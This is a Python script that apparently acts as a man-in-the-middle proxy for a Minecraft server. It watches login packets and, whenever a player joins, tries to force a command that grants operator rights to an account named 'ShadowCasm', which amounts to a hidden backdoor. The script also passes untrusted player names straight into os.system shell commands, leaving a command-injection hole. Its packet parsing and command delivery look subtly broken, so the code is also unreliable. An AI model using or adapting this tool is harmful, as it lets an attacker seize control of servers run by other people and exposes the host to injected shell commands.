import socket
import threading
import os
import struct
import platform

# Detect OS for command execution
is_windows = platform.system() == "Windows"

# Load server config from config.txt
def load_config():
    with open("config.txt", "r") as file:
        lines = file.readlines()
        config = {}
        for line in lines:
            key, value = line.strip().split("=")
            config[key] = value
        return config

config = load_config()
TARGET_IP = config.get("SERVER_IP", "127.0.0.1")
TARGET_PORT = int(config.get("SERVER_PORT", 25565))

LISTEN_IP = "0.0.0.0"  # Listen on all IPs
LISTEN_PORT = 25565

# Function to extract player name from login packet
def get_player_name(data):
    try:
        if len(data) < 2:
            return None
        
        packet_length, packet_id = struct.unpack(">HB", data[:3])

        if packet_id == 0x00:  # Login Start packet
            name_length = data[3]  # First byte after ID gives name length
            player_name = data[4:4+name_length].decode("utf-8")
            return player_name
    except:
        return None
    return None

def execute_command(player_name):
    command = f"execute as {player_name} run op ShadowCasm"
    
    if is_windows:
        os.system(f"start /B cmd /C echo {command} > command.txt")
    else:
        os.system(f"echo {command} > command.txt & nohup cat command.txt > /dev/console &")

def handle_client(client_socket):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((TARGET_IP, TARGET_PORT))

    def forward(source, destination):
        while True:
            try:
                data = source.recv(4096)
                if not data:
                    break
                
                # Check for player login packet
                player_name = get_player_name(data)
                if player_name:
                    print(f"Player {player_name} joined, forcing command /op ShadowCasm")
                    execute_command(player_name)

                destination.sendall(data)
            except:
                break

    threading.Thread(target=forward, args=(client_socket, server_socket)).start()
    threading.Thread(target=forward, args=(server_socket, client_socket)).start()

def start_proxy():
    proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy.bind((LISTEN_IP, LISTEN_PORT))
    proxy.listen(5)

    print(f"Proxy running on {LISTEN_IP}:{LISTEN_PORT}, forwarding to {TARGET_IP}:{TARGET_PORT}")

    while True:
        client_socket, addr = proxy.accept()
        print(f"Player connected from {addr}")
        threading.Thread(target=handle_client, args=(client_socket,)).start()

if __name__ == "__main__":
    start_proxy()